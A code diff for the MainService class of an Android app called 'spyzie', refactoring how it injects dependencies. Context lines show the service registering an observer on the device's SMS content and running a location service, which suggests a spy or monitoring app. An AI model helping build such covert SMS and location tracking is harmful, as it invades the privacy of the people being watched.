@@ -13,17 +13,12 @@ import android.util.Log;
 import androidx.annotation.Nullable;
 
 import com.tantd.spyzie.SpyzieApplication;
-import com.tantd.spyzie.data.network.ApiManager;
+import com.tantd.spyzie.di.module.ServiceModule;
 import com.tantd.spyzie.receiver.SmsObserver;
 import com.tantd.spyzie.receiver.SpyzieReceiver;
 import com.tantd.spyzie.util.Constants;
 
-import javax.inject.Inject;
-
 public class MainService extends Service {
-
-    @Inject
-    ApiManager mApiManager;
 
     private static final String DEBUG_SUB_TAG = "[" + MainService.class.getSimpleName() + "] ";
 
@@ -33,12 +28,20 @@ public class MainService extends Service {
 
     @Override
     public void onCreate() {
-        SpyzieApplication.getInstance().getAppComponent().inject(this);
+        createServiceComponent();
         super.onCreate();
         Log.d(Constants.LOG_TAG, DEBUG_SUB_TAG + "onCreate()");
 
         mContentObserver = new SmsObserver(new Handler(), this);
         getContentResolver().registerContentObserver(Uri.parse("content://sms"), true, mContentObserver);
+    }
+
+    private void createServiceComponent() {
+        SpyzieApplication.getInstance().createServiceComponent(new ServiceModule(this)).inject(this);
+    }
+
+    private void releaseServiceComponent() {
+        SpyzieApplication.getInstance().releaseServiceComponent();
     }
 
     @Override
@@ -65,6 +68,8 @@ public class MainService extends Service {
         unregisterReceiver(mSpyzieReceiver);
 
         LocationService.stopAllWork();
+
+        releaseServiceComponent();
     }
 
     @Nullable
